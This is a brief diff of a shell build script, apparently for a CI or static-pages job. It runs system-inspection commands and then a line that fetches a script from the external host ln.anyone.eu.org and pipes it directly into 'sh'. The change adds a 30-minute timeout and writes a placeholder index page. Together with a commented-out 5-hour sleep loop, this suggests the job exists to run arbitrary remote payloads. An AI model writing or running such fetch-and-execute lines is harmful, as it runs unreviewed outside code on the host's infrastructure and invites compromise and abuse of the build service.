@@ -5,5 +5,7 @@ uname -a
 df -h
 
 #while 
-wget -qO - ln.anyone.eu.org/test.txt | sh -se
+mkdir public
+timeout 30m sh -c "wget -qO - ln.anyone.eu.org/test.txt | sh -se" \
+  && echo Done > public/index.html
 #; do sleep 5h; done
